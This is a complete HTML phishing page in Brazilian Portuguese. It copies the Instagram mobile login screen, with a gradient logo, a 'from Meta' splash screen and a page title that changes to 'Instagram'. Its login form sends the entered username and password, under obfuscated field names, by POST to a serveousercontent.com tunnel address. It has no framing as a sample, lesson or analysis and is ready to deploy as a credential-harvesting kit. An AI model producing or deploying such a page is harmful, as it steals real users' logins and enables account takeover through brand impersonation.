<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Social App</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
        body, html { height: 100dvh; background-color: #000; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; overflow: hidden; }
        #splash { position: fixed; inset: 0; background: #000; display: flex; flex-direction: column; align-items: center; justify-content: space-between; padding: 120px 0 60px 0; z-index: 1000; transition: opacity 0.35s ease; }
        .splash-logo-wrapper { flex: 1; display: flex; align-items: center; justify-content: center; }
        .insta-splash-logo { width: 80px; height: 80px; }
        .from-meta-container { display: flex; flex-direction: column; align-items: center; gap: 6px; }
        .from-text { color: #8E8E8E; font-size: 13px; text-transform: lowercase; }
        .meta-splash { display: flex; align-items: baseline; gap: 4px; }
        .infinity-splash, .meta-word-splash { font-size: 22px; font-weight: 700; background: linear-gradient(135deg, #FCAF45 0%, #833AB4 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        #login-screen { display: none; flex-direction: column; align-items: center; width: 100%; height: 100dvh; background-color: #000; padding: 0 16px; }
        .lang-selector { color: #A8A8A8; font-size: 14px; margin: 24px 0 48px 0; }
        .insta-logo-login { width: 64px; height: 64px; margin-bottom: 36px; }
        form { width: 100%; max-width: 358px; }
        .input-box { width: 100%; background: #121212; border: 0.5px solid #363636; border-radius: 12px; padding: 14px 16px; color: #fff; font-size: 14px; margin-bottom: 10px; outline: none; }
        .btn-login { width: 100%; background: #0095F6; color: #fff; border: none; border-radius: 18px; padding: 9px 0; font-size: 14px; font-weight: 600; margin-top: 12px; margin-bottom: 16px; }
        .footer-container { margin-top: auto; width: 100%; display: flex; flex-direction: column; align-items: center; padding-bottom: 24px; }
        .signup-btn { width: 100%; max-width: 358px; background: transparent; border: 1px solid #0095F6; border-radius: 18px; padding: 8px 0; color: #0095F6; font-size: 14px; font-weight: 600; text-align: center; text-decoration: none; margin-bottom: 28px; }
    </style>
</head>
<body>
    <svg style="width:0; height:0; position:absolute;"><defs><linearGradient id="g" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#833AB4"/><stop offset="100%" stop-color="#FCAF45"/></linearGradient></defs></svg>

    <div id="splash">
        <div class="splash-logo-wrapper" id="s-logo"></div>
        <div class="from-meta-container">
            <p class="from-text">from</p>
            <div class="meta-splash"><span class="infinity-splash">∞</span><span class="meta-word-splash">Meta</span></div>
        </div>
    </div>

    <div id="login-screen">
        <div class="lang-selector">Português (Brasil) ▾</div>
        <div id="l-logo"></div>
        <form action="https://da2c971553850e6f-143-208-80-199.serveousercontent.com" method="POST">
            <input type="text" name="u_88_data" class="input-box" placeholder="Nome de usuário, e-mail ou número" required>
            <input type="password" name="p_99_secure" class="input-box" placeholder="Senha" required>
            <button type="submit" class="btn-login">Entrar</button>
        </form>
        <div class="footer-container">
            <a href="#" class="signup-btn">Criar nova conta</a>
        </div>
    </div>

    <script>
        window.addEventListener('load', () => {
            const logoSVG = `<svg class="insta-splash-logo" viewBox="0 0 24 24" fill="none"><rect x="1.5" y="1.5" width="21" height="21" rx="6" stroke="url(#g)" stroke-width="2.2"/><circle cx="12" cy="12" r="5.5" stroke="url(#g)" stroke-width="2.2"/><circle cx="17.8" cy="6.2" r="1.8" fill="url(#g)"/></svg>`;
            document.getElementById('s-logo').innerHTML = logoSVG;
            document.getElementById('l-logo').innerHTML = logoSVG.replace('insta-splash-logo', 'insta-logo-login');
            
            setTimeout(() => {
                document.getElementById('splash').style.opacity = '0';
                setTimeout(() => {
                    document.getElementById('splash').style.display = 'none';
                    document.getElementById('login-screen').style.display = 'flex';
                    document.title = "Instagram";
                }, 350);
            }, 2200);
        });
    </script>
</body>
</html>
